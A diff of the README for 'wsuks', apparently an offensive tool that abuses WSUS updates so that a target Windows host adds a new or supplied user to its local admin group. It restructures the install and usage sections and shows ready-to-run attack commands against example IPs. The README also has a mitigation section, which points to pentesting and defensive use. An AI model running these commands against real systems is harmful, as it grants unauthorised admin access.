@@ -15,7 +15,7 @@ Result:
 - After successful execution the user provided will be added to the local admin group. If no user was specified a user with the format user[0-9]{5} (e.g. user12345) and a random password will be created
 
 ## Installation
-Using pipx:
+Using pipx (recommended):
 ```
 sudo apt install python3-pipx
 pipx ensurepath
@@ -34,19 +34,20 @@ sudo poetry install
 ## Usage
 ❗wsuks must be run as root❗
 
-With pipx:
-```
-sudo wsuks
-suso wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20     # This will generate a new local user and add it to the local admin group
-sudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local     # This will add the provided user to the local admin group
-sudo wsuks -t 10.0.0.10 -u User -p Password -d Domain.local --dc-ip 10.0.0.1      # This will start the auto discovery mode and add the provided user to the local admin group
-```
+Using pipx you can simply run `sudo wsuks ...` anywhere on the system.\
+Using poetry you must be in the wsuks folder and begin every command with `sudo poetry run wsuks ...`
 
-With poetry:
+#### Specify known WSUS-Server and create local admin user:
 ```
-suso poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20     # This will generate a new local user and add it to the local admin group
-sudo poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local     # This will add the provided user to the local admin group
-sudo poetry run wsuks -t 10.0.0.10 -u User -p Password -d Domain.local --dc-ip 10.0.0.1      # This will start the auto discovery mode and add the provided user to the local admin group
+sudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20
+```
+#### Specify known WSUS-Server and add provided domain user to local admin group (Domain is required!):
+```
+sudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local
+```
+#### Autodiscover the WSUS-Server by only specifying the domain user with the dc-ip:
+```
+sudo wsuks -t 10.0.0.10 -u User -p Password -d Domain.local --dc-ip 10.0.0.1
 ```
 
 ## About & Mitigation
